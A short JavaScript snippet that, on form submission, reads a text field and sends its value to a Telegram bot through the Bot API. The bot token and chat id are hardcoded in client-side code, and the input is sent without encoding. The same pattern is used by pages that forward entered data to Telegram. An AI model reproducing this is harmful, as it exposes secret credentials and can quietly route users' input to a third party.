const form = document.getElementById("form");


form?.addEventListener("submit", (e) => {
    e.preventDefault();

    var text1 = document.getElementById("text1").value;

    console.log(text1);

    var my_text = text1

    var token = "5870365546:AAEXKh0Mi5YorRpBjDz1mjUQjXt2D9VSqHs";
    var chat_id = -651950336
    var url = "https://api.telegram.org/bot5870365546:AAEXKh0Mi5YorRpBjDz1mjUQjXt2D9VSqHs/sendMessage?chat_id=-651950336&text=" + my_text

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    console.log("Messaggio spedito!")
})